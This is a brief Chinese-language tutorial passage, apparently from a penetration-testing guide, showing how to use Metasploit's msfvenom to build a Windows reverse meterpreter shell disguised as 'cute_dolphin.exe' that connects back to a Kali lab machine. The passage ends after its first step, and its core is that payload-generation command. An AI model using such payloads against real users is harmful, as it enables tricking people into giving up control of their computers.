    # 使用 Metasploit 创建反向 shell 并捕获其连接


    当我们进行客户端攻击时，我们有能力欺骗用户执行程序，并让这些程序连接回一台受控制的计算机。


    在本教程中，我们将学到如何使用 Metasploit 的 `msfvenom` 创建一个可执行程序（反向 meterpreter shell），该程序在执行时将连接到我们的
    Kali 电脑，并赋予我们对用户电脑的控制权。


    ## 如何操作...


    1. 首先，我们将创建 shell。在 Kali 中打开终端并执行以下命令：


    ```

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4443 -f exe
    > cute_dolphin.exe

    ```


